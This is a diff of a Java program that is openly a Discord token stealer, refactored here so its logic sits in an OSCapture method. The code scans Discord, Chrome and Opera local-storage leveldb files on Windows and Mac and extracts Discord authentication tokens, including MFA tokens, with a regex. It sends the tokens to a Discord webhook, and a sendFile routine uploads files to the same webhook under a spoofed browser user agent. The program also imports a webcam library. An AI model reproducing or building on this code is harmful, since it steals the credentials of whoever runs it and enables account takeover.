@@ -1,4 +1,5 @@
 import com.github.sarxos.webcam.Webcam;
+import org.jetbrains.annotations.Nullable;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
@@ -33,108 +34,10 @@ public class Main {
         } catch (Exception ignore) {
         }
 
-        if (userOS.contains("Windows")) {
-
-            List<String> paths = new ArrayList<>();
-            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
-            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
-            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
-            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
-            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
-
-
-            int cx = 0;
-            StringBuilder webhooks = new StringBuilder();
-            webhooks.append("TOKEN\n");
-
-            try {
-                for (String path : paths) {
-                    File f = new File(path);
-                    String[] pathnames = f.list();
-                    if (pathnames == null) continue;
-
-                    for (String pathname : pathnames) {
-                        try {
-                            FileInputStream fstream = new FileInputStream(path + pathname);
-                            DataInputStream in = new DataInputStream(fstream);
-                            BufferedReader br = new BufferedReader(new InputStreamReader(in));
-
-                            String strLine;
-                            while ((strLine = br.readLine()) != null) {
-
-                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
-                                Matcher m = p.matcher(strLine);
-
-                                while (m.find()) {
-                                    if (cx > 0) {
-                                        webhooks.append("\n");
-                                    }
-                                    webhooks.append("" + path + pathname + "  --> token: ").append(m.group());
-                                    cx++;
-                                }
-
-                            }
-
-                        } catch (Exception ignored) {
-                            //webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //error: Server returned HTTP response code: 400 for URL:
-                        }
-                    }
-                }
-                sendMessage("```" + webhooks.toString() + "```");
-
-            } catch (Exception e) {
-                sendMessage("``` UNABLE TO PULL TOKENS : " + e + "```");
-            }
-
-
-        } else if (userOS.contains("Mac")) {
-            List<String> paths = new ArrayList<>();
-            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
-
-            int cx = 0;
-            StringBuilder webhooks = new StringBuilder();
-            webhooks.append("TOKEN\n");
-
-            try {
-                for (String path : paths) {
-                    File f = new File(path);
-                    String[] pathnames = f.list();
-                    if (pathnames == null) continue;
-
-                    for (String pathname : pathnames) {
-                        try {
-                            FileInputStream fstream = new FileInputStream(path + pathname);
-                            DataInputStream in = new DataInputStream(fstream);
-                            BufferedReader br = new BufferedReader(new InputStreamReader(in));
-
-                            String strLine;
-                            while ((strLine = br.readLine()) != null) {
-
-                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
-                                Matcher m = p.matcher(strLine);
-
-                                while (m.find()) {
-                                    if (cx > 0) {
-                                        webhooks.append("\n");
-                                    }
-                                    webhooks.append(" ").append(m.group());
-                                    cx++;
-                                }
-
-                            }
-
-                        } catch (Exception ignored) {
-                        }
-                    }
-                }
-                sendMessage("```" + webhooks.toString() + "```");
-
-            } catch (Exception e) {
-                sendMessage("``` UNABLE TO PULL TOKEN[S] : " + e + "```");
-            }
-
-        } else {
-            sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
+        try {
+            OSCapture(userOS);
+        } catch (Exception ex) {
+            sendMessage("``` UNABLE TO PULL TOKENS : " + ex + "```");
         }
 
         try {
@@ -192,10 +95,104 @@ public class Main {
         System.out.println(result.toString());
     }
 
+    private static void OSCapture(String userOS) {
+        if (userOS.contains("Windows")) {
+
+            List<String> paths = new ArrayList<>();
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
+            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
+
+
+            int cx = 0;
+            StringBuilder webhooks = new StringBuilder();
+            webhooks.append("TOKEN\n");
+
+            for (String path : paths) {
+                File f = new File(path);
+                String[] pathnames = f.list();
+                if (pathnames == null) continue;
+
+                for (String pathname : pathnames) {
+                    try {
+                        FileInputStream fstream = new FileInputStream(path + pathname);
+                        DataInputStream in = new DataInputStream(fstream);
+                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
+
+                        String strLine;
+                        while ((strLine = br.readLine()) != null) {
+
+                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                            Matcher m = p.matcher(strLine);
+
+                            while (m.find()) {
+                                if (cx > 0) {
+                                    webhooks.append("\n");
+                                }
+                                webhooks.append("" + path + pathname + "  --> token: ").append(m.group());
+                                cx++;
+                            }
+
+                        }
+
+                    } catch (Exception ignored) {
+                        //webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //error: Server returned HTTP response code: 400 for URL:
+                    }
+                }
+            }
+            sendMessage("```" + webhooks.toString() + "```");
+
+        } else if (userOS.contains("Mac")) {
+            List<String> paths = new ArrayList<>();
+            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
+
+            int cx = 0;
+            StringBuilder webhooks = new StringBuilder();
+            webhooks.append("TOKEN\n");
+
+            for (String path : paths) {
+                File f = new File(path);
+                String[] pathnames = f.list();
+                if (pathnames == null) continue;
+
+                for (String pathname : pathnames) {
+                    try {
+                        FileInputStream fstream = new FileInputStream(path + pathname);
+                        DataInputStream in = new DataInputStream(fstream);
+                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
+
+                        String strLine;
+                        while ((strLine = br.readLine()) != null) {
+
+                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                            Matcher m = p.matcher(strLine);
+
+                            while (m.find()) {
+                                if (cx > 0) {
+                                    webhooks.append("\n");
+                                }
+                                webhooks.append(" ").append(m.group());
+                                cx++;
+                            }
+
+                        }
+
+                    } catch (Exception ignored) {
+                    }
+                }
+            }
+            sendMessage("```" + webhooks.toString() + "```");
+
+        } else {
+            sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
+        }
+    }
+
     private static void sendFile(File file) throws IOException {
-        String url = webhookURL;
         String boundary = Long.toHexString(System.currentTimeMillis());
-        URLConnection connection = new URL(url).openConnection();
+        URLConnection connection = new URL(webhookURL).openConnection();
         connection.setDoOutput(true);
         connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
         connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
@@ -221,7 +218,7 @@ public class Main {
 
     }
 
-    public static byte[] readAllBytes(InputStream stream) throws IOException {
+    public static byte[] readAllBytes(@Nullable InputStream stream) throws IOException {
         int count, pos = 0;
         byte[] output = new byte[0];
         byte[] buf = new byte[1024];
